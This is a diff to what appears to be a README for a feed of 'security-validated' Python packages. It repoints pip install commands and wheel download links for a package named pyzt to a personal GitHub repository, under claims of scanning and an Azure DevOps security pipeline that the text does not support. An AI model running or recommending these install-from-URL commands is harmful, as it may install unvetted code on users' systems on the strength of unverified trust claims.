@@ -28,7 +28,7 @@ This repository contains Python packages validated through automated security sc
 | [`xlrd`](#xlrd) | `2.0.2` | 2026-06-11 |
 | [`sqlalchemy`](#sqlalchemy) | `2.0.50` | 2026-06-11 |
 | [`reportlab`](#reportlab) | `4.5.1` | 2026-06-11 |
-| [`pyzipper`](#pyzipper) | `0.4.0` | 2026-06-11 |
+| [`pyzt`](#pyzt) | `0.0.4` | 2026-06-11 |
 
 ## 📦 Available Packages
 
@@ -569,13 +569,14 @@ pip install https://github.com/bdousa/PythonFeed-Update/releases/download/pyzipp
 
 #### `pyzt`
 - **Latest version:** `0.0.4`
-- **Validated:** 2025-10-10
+- **Validated:** 2026-06-11
 - **Package type:** Universal wheel (Python 3+)
-- **Download wheel:** [download](https://github.com/bdousa/pythonFeedWindows/releases/download/pyzt-v0.0.4/pyzt-0.0.4-py3-none-any.whl)
-- **Release notes:** [release](https://github.com/bdousa/pythonFeedWindows/releases/tag/pyzt-v0.0.4)
+- **Download wheel:** [download](https://github.com/bdousa/PythonFeed-Update/releases/download/pyzt-v0.0.4/pyzt-0.0.4-py3-none-any.whl)
+- **Release notes:** [release](https://github.com/bdousa/PythonFeed-Update/releases/tag/pyzt-v0.0.4)
+- **Validation run:** [build #27298835064](https://github.com/bdousa/PythonFeed-Update/actions/runs/27298835064)
 - **Quick command:**
 ```text
-pip install https://github.com/bdousa/pythonFeedWindows/releases/download/pyzt-v0.0.4/pyzt-0.0.4-py3-none-any.whl
+pip install https://github.com/bdousa/PythonFeed-Update/releases/download/pyzt-v0.0.4/pyzt-0.0.4-py3-none-any.whl
 ```
 
 ### R
@@ -753,6 +754,6 @@ To request validation of a new package:
 2. **Select Category**: Choose '3rd party library approval'
 3. **Approval Process**: Packages typically validated within 3 business days
 
-*Last updated: 2026-06-11 16:25 UTC*
+*Last updated: 2026-06-11 16:27 UTC*
 
 *Powered by Azure DevOps Security Pipeline*
